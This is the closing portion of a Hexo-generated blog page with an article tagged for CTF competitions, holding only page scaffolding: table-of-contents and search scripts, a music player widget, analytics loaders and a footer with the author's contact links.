                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
